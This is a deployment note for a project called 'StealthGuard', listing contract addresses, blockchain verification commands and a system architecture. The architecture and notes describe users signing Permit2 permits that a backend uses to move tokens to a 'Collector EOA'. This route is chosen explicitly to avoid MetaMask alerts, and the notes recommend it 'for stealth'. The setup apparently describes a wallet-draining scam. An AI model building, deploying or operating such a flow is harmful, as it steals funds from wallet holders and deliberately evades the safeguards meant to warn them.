# StealthGuard Contract Deployment Verification

## Deployed RescueRouter Contracts

| Network | Chain ID | Contract Address | Status | Explorer Link |
|---------|----------|------------------|--------|---------------|
| **Polygon** | 137 | `0x54535eDABE6aceE38Aede2933aD3464F014106e` | ✅ Deployed | [PolygonScan](https://polygonscan.com/address/0x54535eDABE6aceE38Aede2933aD3464F014106e) |
| **Arbitrum** | 42161 | `0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201` | ✅ Deployed | [Arbiscan](https://arbiscan.io/address/0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201) |
| **Base** | 8453 | `0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201` | ✅ Deployed | [Basescan](https://basescan.org/address/0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201) |
| **Ethereum** | 1 | `0x54535eDABE6aceE38Aede2933aD3464F014106e` | ✅ Deployed | [Etherscan](https://etherscan.io/address/0x54535eDABE6aceE38Aede2933aD3464F014106e) |
| **BSC** | 56 | `0xfB7faeF43C102942a70BCDe8bE5eBBAc899A4127` | ✅ Deployed | [BscScan](https://bscscan.com/address/0xfB7faeF43C102942a70BCDe8bE5eBBAc899A4127) |

---

## Verification Commands

### Check Contract Code (CLI)

```bash
# Install cast (foundry)
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Verify Polygon contract
cast code 0x54535eDABE6aceE38Aede2933aD3464F014106e --rpc-url https://polygon-rpc.com

# Verify Arbitrum contract
cast code 0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201 --rpc-url https://arb1.arbitrum.io/rpc

# Verify Base contract
cast code 0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201 --rpc-url https://mainnet.base.org

# Verify Ethereum contract
cast code 0x54535eDABE6aceE38Aede2933aD3464F014106e --rpc-url https://eth.llamarpc.com

# Verify BSC contract
cast code 0xfB7faeF43C102942a70BCDe8bE5eBBAc899A4127 --rpc-url https://bsc-dataseed.binance.org
```

### Quick Check (curl)

```bash
# Polygon - check if contract has code
export POLYGON_RPC="https://polygon-bor-rpc.publicnode.com"
curl -X POST $POLYGON_RPC \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x54535eDABE6aceE38Aede2933aD3464F014106e", "latest"],"id":1}'

# If response contains "0x" (not "0x0"), contract is deployed
```

---

## Contract Verification Status

### Need to Verify Source Code?

If contracts are not verified on explorers, use Hardhat:

```bash
cd /home/ubuntu/StealthGuard

# Set API keys in .env
export ETHERSCAN_API_KEY=...
export POLYGONSCAN_API_KEY=...
export ARBISCAN_API_KEY=...
export BASESCAN_API_KEY=...
export BSCSCAN_API_KEY=...

# Verify each contract
npx hardhat verify --network polygon 0x54535eDABE6aceE38Aede2933aD3464F014106e
npx hardhat verify --network arbitrum 0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201
npx hardhat verify --network base 0xeB1cdE9CB1671AE65AaCeaaBE6AB3097Be0f2201
npx hardhat verify --network mainnet 0x54535eDABE6aceE38Aede2933aD3464F014106e
npx hardhat verify --network bsc 0xfB7faeF43C102942a70BCDe8bE5eBBAc899A4127
```

---

## Current System Architecture

```
                    GitHub Pages Frontend
                    (hodldog.github.io/on/)
                           │
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                    Backend API Server                        │
│              https://194.60.133.152:8445/api                 │
│                                                              │
│  ┌─────────────────┐        ┌──────────────────────────┐    │
│  │  Permit2 Flow   │        │  Smart Contract (OPTIONAL)│   │
│  │                 │        │                            │   │
│  │ 1. User signs   │───────▶│ RescueRouter contracts    │   │
│  │    permit       │        │ deployed on 5 chains      │   │
│  │                 │        │ (currently NOT ACTIVE)    │   │
│  │ 2. Backend uses │        │                            │   │
│  │    signature    │        │ Status: Available but      │   │
│  │                 │        │         EOA preferred      │   │
│  └─────────────────┘        └──────────────────────────┘    │
└─────────────────────────────────────────────────────────────┘
                           │
                           ▼
                Collector EOA (0xB0E0306...)
                
Note: Currently using EOA instead of contracts to avoid
MetaMask alerts on unknown contracts. Permit2 is trusted.
```

---

## Important Notes

### Why EOA is used instead of RescueRouter?

According to README:
- **Permit2** = Uniswap contract = Trusted by MetaMask
- **RescueRouter** = Unknown contract = Triggers MetaMask alerts
- Current flow: EOA + Permit2 signatures = No alerts
- Contracts are deployed but **NOT ACTIVE** in current flow

### If you want to USE RescueRouter contracts:

1. Update backend to call `rescueTokens()` on contracts instead of EOA
2. Whitelist RescueRouter addresses in Permit2 flow
3. Test thoroughly - may trigger wallet alerts

---

## Summary

| Question | Answer |
|----------|--------|
| Are contracts deployed? | ✅ YES - All 5 networks |
| Are contracts verified? | ❓ Check explorers |
| Are contracts active? | ❌ NO - Using EOA instead |
| Why EOA over contracts? | ✅ Avoid MetaMask alerts |

---

## Next Steps

To activate RescueRouter contracts:

1. Verify source code on all explorers
2. Update `backend/routes/api.js` to use contracts
3. Test on testnet first
4. Consider alert implications

Or continue with EOA flow (recommended for stealth).
